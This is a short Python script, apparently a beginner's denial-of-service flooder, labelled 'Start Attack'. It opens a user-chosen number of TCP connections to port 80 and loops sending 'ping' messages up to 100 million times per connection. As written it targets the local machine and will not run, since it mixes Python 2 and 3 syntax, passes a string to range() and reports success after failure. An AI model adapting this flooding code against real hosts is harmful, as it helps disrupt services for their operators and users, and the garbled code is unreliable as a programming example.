#!/usr/bin/python
import os, sys, socket, time, string

print("Start Attack")
conn = input("Number of connections to make: ")
message = "ping"

def attack():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #Creating socket
    host = socket.gethostname()                              #Get local machine name
    port = 80                                                #Reserve port number
#    sock.connect((host,port))

    try:                                                    #Attempt Connections
        sock.connect((host, port))                          #Make connection
        for i in range(100000000):                          #Loop sending to host
            sock.send(message)                              #Sending message
    except socket.error, msg:                               #Failed connection report err
        print("Connection Failed")
    print("Connection Success")                             #Connection success
    sock.close()                                            #Closing socket

for i in range(conn):                                       #Loop number connections
    attack()                                                #Execute attack
